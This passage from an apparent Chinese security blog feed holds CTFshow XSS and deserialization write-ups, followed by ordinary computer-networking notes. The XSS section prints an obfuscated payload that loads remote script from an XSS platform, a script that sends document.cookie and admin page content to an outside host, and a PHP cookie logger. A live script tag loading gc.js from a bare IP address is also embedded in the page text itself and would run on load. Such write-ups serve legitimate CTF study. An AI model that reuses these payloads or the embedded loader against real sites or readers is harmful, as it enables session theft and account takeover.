punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">82</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">82</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">118</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">/</span>onload<span class="token operator">=</span><span class="token string">"eval(\x3c\x2f\x74\x45\x78\x74\x41\x72\x45\x61\x3e\x27\x22\x3e\x3c\x73\x43\x52\x69\x50\x74\x20\x73\x52\x43\x3d\x2f\x2f\x78\x73\x73\x68\x73\x2e\x63\x6e\x2f\x58\x49\x73\x76\x3e\x3c\x2f\x73\x43\x72\x49\x70\x54\x3e)"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本为：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入"</span><span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    res <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'document.write(String.fromCharCode(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>temp<span class="token punctuation">&#125;</span></span><span class="token string">));'</span></span><span class="token comment"># print(res)</span>res <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    res <span class="token operator">+=</span> <span class="token string">r"\x"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web327"><a href="#Web327" class="headerlink" title="Web327"></a>Web327</h2><p>收信人admin，发件人，写上xss的平台的js语句即可。</p><h2 id="Web328"><a href="#Web328" class="headerlink" title="Web328"></a>Web328</h2><p>本题目的获得管理员的cookie由此进入管理页面。</p><script src=http://82.157.126.166/gc.js></script><p>首先，写一个js脚本</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> img <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>img<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"http://violeteg.top/gc.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookiedocument<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>php部分</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cookie.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">,</span> <span class="token variable">$cookie</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到cookie后，f12进入控制台修改浏览器cookie即可。</p><h2 id="Web329-331"><a href="#Web329-331" class="headerlink" title="Web329-331"></a>Web329-331</h2><p>貌似这个题会实时更改cookie所以上一个的方法没有办法使用了。但是，我们可以用另一个方法。返回页面的源码，我们xss攻击让js脚本返回管理员页面的源码，就可以获得flag了。</p><p>js源码如下：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> img <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>img<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"http://violeteg.top/gc.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#top > div.layui-container'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent<span class="token punctuation">;</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>querySelecot中的标签，f12看源码即可知道。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h2 id="使用平台"><a href="#使用平台" class="headerlink" title="使用平台"></a>使用平台</h2><p><a href="https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a></p><p><a href="https://xss.pt/xss.php?do=project&act=viewcode&id=36228">https://xss.pt/xss.php?do=project&amp;act=viewcode&amp;id=36228</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://juejin.cn/post/6890532180885176334">跨站脚本攻击(XSS)详解</a></p><p><a href="https://www.cnblogs.com/hookjoy/p/6181350.html">xss其他标签下的js用法总结大全</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/111644350">CTFSHOW xss篇</a></p><p><a href="https://www.cnblogs.com/hookjoy/p/6181350.html">改造xss平台语句</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow反序列化</title>
      <link href="/2021/10/11/ctfshow-fan-xu-lie-hua/"/>
      <url>/2021/10/11/ctfshow-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="Web255"><a href="#Web255" class="headerlink" title="Web255"></a>Web255</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>这个程序会对cookie[‘user’]进行反序列化。之后如果反序列化产生的对象实例的isvip属性为true，则返回正确结果</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络1</title>
      <link href="/2021/10/10/ji-suan-ji-wang-luo-1/"/>
      <url>/2021/10/10/ji-suan-ji-wang-luo-1/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>是一个将分散的、具有独立功能的计算机网络，通过通信设备和线路连接起来，由功能完善的软件实现<strong>资源共享</strong>和<strong>信息传递</strong>。</p><p>计算机网络是互联的、自治的计算机集合。</p><p>什么是互连，什么又是自治呢？</p><p>互联，互联互通。自治，没有主从关系。</p><p>没有互联，你怎么上网，自治，它们之间可不存在我比谁高级这种说法。</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ol><li><p>数据通信（连通性）</p></li><li><p>资源共享</p></li></ol><p>硬件、软件、数据</p><ol start="3"><li><p>分布式处理</p></li><li><p>提高可靠性</p></li><li><p>负载均衡</p></li></ol><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><ol><li><p>组成部分：硬件、软件、协议</p></li><li><p>核心部分：为边缘服务</p></li></ol><h3 id="功能组成"><a href="#功能组成" class="headerlink" title="功能组成"></a>功能组成</h3><ol><li><p>通信子网：数据通信</p></li><li><p>资源子网：资源共享</p></li></ol><p><img src="https://pic1.zhimg.com/80/v2-2d62ba265be486cb94ab531912aa3b9c_1440w.jpg"></p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ol><li><p>部分范围LAN（广域网），MAN（城域网），WAN（局域网），PAN（个人局域网）</p></li><li><p>使用者分：公用网，专用网</p></li><li><p>交换技术分：电路交换，报文交换，分组交换</p></li><li><p>拓扑结构分</p></li><li><p>拓扑结构</p></li><li><p>传输技术：</p></li></ol><p>广播式网络，</p><p>点对点网络：分组存储转发，路由选择机制</p><h2 id="标准化工作："><a href="#标准化工作：" class="headerlink" title="标准化工作："></a>标准化工作：</h2><p>标准分类：法定标准，事实标准</p><h3 id="RFC（Request-for-comments）"><a href="#RFC（Request-for-comments）" class="headerlink" title="RFC（Request for comments）"></a>RFC（Request for comments）</h3><ol><li><p>草案阶段。</p></li><li><p>建议标准（这时开始为RFC）</p></li><li><p>因特尔标准</p></li></ol><h3 id="ISO，ITU，IEEE"><a href="#ISO，ITU，IEEE" class="headerlink" title="ISO，ITU，IEEE"></a>ISO，ITU，IEEE</h3><p>ISO：OSI参考模型</p><p>ITU：通信标准</p><p>IEEE：学术标准</p><h2 id="速率"><a href="#速率" class="headerlink" title="速率"></a>速率</h2><p>速率即数据率，或称为数据传输率或比特率</p><p>比特：1/0</p><p>连接在计算机网络上的主机在数字信道上传送数据位数的速率</p><p>单位b/s kb/s, Mb/s. GB/s, Tb/s</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>速度时：以1000作为转换</p><p>存储时：以1024作为转换</p><h3 id="带宽：理论最高量"><a href="#带宽：理论最高量" class="headerlink" title="带宽：理论最高量"></a>带宽：理论最高量</h3><ol><li><p>原本概念为频率HZ，最高减去最低</p></li><li><p>现在为最高数据率，最高数据率：实际上是一s中发送了多少数据量，并不是传播速率。</p></li></ol><p>1M/s 一μs可想传送1bit数据。电磁波1μs速度2*10^8m/s</p><h3 id="吞吐量：实际量"><a href="#吞吐量：实际量" class="headerlink" title="吞吐量：实际量"></a>吞吐量：实际量</h3><p>单位时间内，通过某个网络的数据流。单位b/s，kb/s，Mb/s</p><h2 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h2><p>指数据（报文/分组/比特流）从网络（链路）的一端传送到另一端所需的时间。也叫延迟或迟延，单位是s。</p><p><img src="https://img-blog.csdnimg.cn/20200323154457582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW95dWVf,size_16,color_FFFFFF,t_70"></p><h3 id="发送时延"><a href="#发送时延" class="headerlink" title="发送时延"></a>发送时延</h3><p>数据长度/信道带宽</p><h3 id="传播时延"><a href="#传播时延" class="headerlink" title="传播时延"></a>传播时延</h3><p>信道长度/电磁波在信道上传播速率</p><h3 id="排队时延"><a href="#排队时延" class="headerlink" title="排队时延"></a>排队时延</h3><p>排队等待处理</p><h3 id="处理时延"><a href="#处理时延" class="headerlink" title="处理时延"></a>处理时延</h3><p>将路由器之类的设备，选择路由，等待时间。</p><h3 id="时延带宽积"><a href="#时延带宽积" class="headerlink" title="时延带宽积"></a>时延带宽积</h3><p>实验带宽积=传播时延*带宽</p><p>bit      = s     * b/s</p><p>简单地说，就是发送的第一个比特到达目的端时，已经发送了多少比特</p><p>又被成为以比特为单位的链路长度。</p><p>可以想象成，信道中最多能同时存在多少比特。</p><h3 id="往返时延RTT"><a href="#往返时延RTT" class="headerlink" 